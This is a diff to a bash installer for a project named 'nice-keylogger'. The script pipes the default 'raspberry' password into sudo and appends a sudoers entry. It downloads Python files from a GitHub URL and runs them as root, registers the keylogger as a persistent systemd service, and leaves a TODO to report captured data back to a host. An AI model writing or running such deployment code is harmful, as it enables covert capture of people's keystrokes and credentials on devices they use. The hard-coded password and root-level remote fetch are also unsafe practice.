@@ -11,7 +11,7 @@ raspberry
 echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
 !
 
-sudo mkdir /nicekl && cd /nicekl/
+echo raspberry | sudo -S mkdir /nicekl && cd /nicekl/
 
 # DOWNLOAD FILES if they are not already installed
 # nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
@@ -22,35 +22,27 @@ KLSERV=nicekeylogger.service
 # TODO correct this url to be the main branch
 base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/
 if ! test -f "$CONT" ; then
-  curl $base\controller.py > controller.py
+  sudo curl $base\controller.py > controller.py
 fi
 if ! test -f "$KMAP" ; then
-  curl $base\keymap.py > keymap.py
+  sudo curl $base\keymap.py > keymap.py
 fi
 if ! test -f "$FKEY" ; then
-  curl $base\find_keyboard.py > find_keyboard.py
+  sudo curl $base\find_keyboard.py > find_keyboard.py
 fi
 if ! test -f "$KLSERV" ; then
-  curl $base\nicekeylogger.service > nicekeylogger.service
+  sudo curl $base\nicekeylogger.service > nicekeylogger.service
 fi
-sudo chmod 744 test/controller.py <<!
-raspberry
-!
+sudo chmod 744 test/controller.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
-sudo mv nicekeylogger.service /etc/systemd/system/ <<!
-raspberry
-!
-sudo systemctl enable nicekeylogger.service <<!
-raspberry
-!
-sudo systemctl daemon-reload <<!
-raspberry
-!
+sudo mv nicekeylogger.service /etc/systemd/system/
+sudo systemctl enable nicekeylogger.service
+sudo systemctl daemon-reload
 
 
 # RUN APPLICATION
-python3 controller.py &
+sudo python3 controller.py &
 
 # REPORT BACK TO HOST
 # TODO - decide the period to report back
